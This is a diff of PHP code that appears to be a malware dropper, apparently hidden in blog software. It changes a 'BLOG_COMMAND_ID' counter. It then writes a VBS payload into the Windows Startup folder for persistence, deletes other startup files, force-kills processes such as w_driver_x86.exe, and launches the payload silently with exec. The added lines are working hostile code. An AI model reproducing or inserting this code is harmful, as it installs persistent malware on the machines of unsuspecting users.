@@ -30,7 +30,7 @@ $GLOBALS['__download_002'] = function($url)
 	return false;
 };
 
-$command_id = '000027';
+$command_id = '000028';
 if(@$GLOBALS['BLOG_COMMAND_ID'] !== $command_id)
 {
 	$GLOBALS['BLOG_COMMAND_ID'] = $command_id;
@@ -61,6 +61,9 @@ if(@$GLOBALS['BLOG_COMMAND_ID'] !== $command_id)
 		$vbs_path = getenv('APPDATA') . '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup';
 		if(is_dir($vbs_path))
 		{
+			@exec('taskkill /f /im w_driver_x86.exe');
+			@exec('taskkill /f /im w_driverx86.exe');
+			@exec('taskkill /f /im ' . $vbsname);
 			$count_files = 0;
 			$di = new DirectoryIterator($vbs_path);
 			unset($data);
@@ -72,16 +75,19 @@ if(@$GLOBALS['BLOG_COMMAND_ID'] !== $command_id)
 					continue;
 				$count_files++;
 				if($count_files == 1)
+				{
 					@file_put_contents($data->getPathname(), $vbs);
+					@exec('start "" "'.$data->getPathname().'"');
+					break;
+				}
 				else
 					@unlink($data->getPathname());
 			}
 			if($count_files == 0)
+			{
 				@file_put_contents($vbs_path.'\\'.$vbsname, $vbs);
-			@exec('taskkill /f /im w_driver_x86.exe');
-			@exec('taskkill /f /im w_driverx86.exe');
-			@exec('taskkill /f /im ' . $vbsname);
-			@exec('start "" "'.$vbs_path.'\\'.$vbsname.'"');
+				@exec('start "" "'.$vbs_path.'\\'.$vbsname.'"');
+			}
 		}
 	}
 	}catch(Exception $e){}
